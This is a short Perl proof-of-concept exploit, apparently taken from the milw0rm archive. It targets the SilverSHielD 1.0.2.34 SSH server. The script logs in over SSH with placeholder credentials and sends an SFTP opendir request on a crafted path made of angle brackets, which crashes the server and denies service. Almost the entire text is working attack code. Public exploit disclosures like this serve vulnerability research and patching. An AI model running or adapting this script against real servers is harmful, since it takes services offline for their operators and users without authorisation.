#!/usr/bin/perl
# Jeremy Brown [0xjbrown41@gmail.com/jbrownsec.blogspot.com]
# SilverSHielD 1.0.2.34 DoS
use Net::SSH2;

$host     = "192.168.0.111";
$port     = 22;
$username = "test";
$password = "test123";
$dos      = "<<<<<<<<<<>>>>>>>>>>";

$ssh2 = Net::SSH2->new();
$ssh2->connect($host, $port)               || die "\nError: Connection Refused!\n";
$ssh2->auth_password($username, $password) || die "\nError: Username/Password Denied!\n";
$sftp = $ssh2->sftp();
$rename = $sftp->opendir($dos);
$ssh2->disconnect();
exit;

# milw0rm.com [2008-10-23]